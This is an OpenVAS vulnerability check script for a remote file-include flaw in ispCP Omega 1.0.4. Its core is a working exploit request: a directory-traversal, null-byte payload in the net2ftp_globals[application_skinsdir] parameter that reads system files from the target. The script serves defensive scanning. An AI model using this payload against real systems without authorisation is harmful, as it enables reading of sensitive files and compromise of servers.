###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ispcp_38644.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# ispCP Omega 'net2ftp_globals[application_skinsdir]' Parameter Remote File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ispCP Omega is prone to a remote file-include vulnerability
because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file
containing malicious PHP code and execute it in the context of the
webserver process. This may facilitate a compromise of the application
and the underlying system; other attacks are also possible.

ispCP Omega 1.0.4 is vulnerable; other versions may also be affected.";

if(description)
{
 script_id(100526);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-03-11 12:36:18 +0100 (Thu, 11 Mar 2010)");
 script_bugtraq_id(38644);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("ispCP Omega 'net2ftp_globals[application_skinsdir]' Parameter Remote File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38644");
 script_xref(name : "URL" , value : "http://isp-control.net/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/ispcp", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache(item:url, port:port);
  if( buf == NULL )continue;

  if(egrep(pattern: "Powered by <a[^>]+>ispCP Omega", string: buf, icase: TRUE)) {

    foreach file (keys(files)) {

      url = string(dir,"/tools/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=../../../../../../../../../../../",files[file] ,"%00");

      if(http_vuln_check(port:port, url:url,pattern:file)) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
